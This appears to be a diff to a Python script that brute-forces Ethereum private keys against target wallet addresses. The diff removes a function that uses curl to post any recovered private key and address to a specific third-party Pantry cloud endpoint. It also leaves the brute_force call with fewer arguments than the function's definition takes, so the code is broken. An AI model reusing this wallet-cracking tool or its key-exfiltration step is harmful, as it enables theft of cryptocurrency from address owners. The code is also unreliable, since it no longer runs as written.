@@ -32,27 +32,7 @@ def check_address(target_address, counter, file_path):
             if eth_address.lower() == target_address.lower():  # Check for match (case-insensitive)
                 return private_key, eth_address
 
-def post_to_pantry(private_key, eth_address):
-    """Post the private key and Ethereum address to the Pantry API."""
-    data = {
-        "user": {
-            "id": 123,
-            "name": "John Doe",
-            "email": "john.doe@example.com"
-        },
-        "private_key": private_key,
-        "eth_address": eth_address,
-        "notes": "Match found!"
-    }
-    json_data = json.dumps(data)
 
-    curl_command = [
-        'curl', '-X', 'POST', '-H', 'Content-type: application/json',
-        '-d', json_data,
-        'https://getpantry.cloud/apiv1/pantry/123581d0-cf4c-48d2-b426-904e8e6ef00f/basket/testBasket'
-    ]
-
-    subprocess.run(curl_command)
 
 def brute_force(target_addresses, num_workers, file_path):
     """Brute-force the private key using multiprocessing."""
@@ -124,8 +104,7 @@ if __name__ == "__main__":
     ]
 
 
-    num_workers = os.cpu_count()  # Use all available CPU cores
+    # Use all available CPU cores
     output_file = "eth_address_output.txt"  # File to save the output
 
-    print(f"Starting brute force with {num_workers} workers...")
-    brute_force(target_addresses, num_workers, output_file)
+    brute_force(target_addresses, output_file)
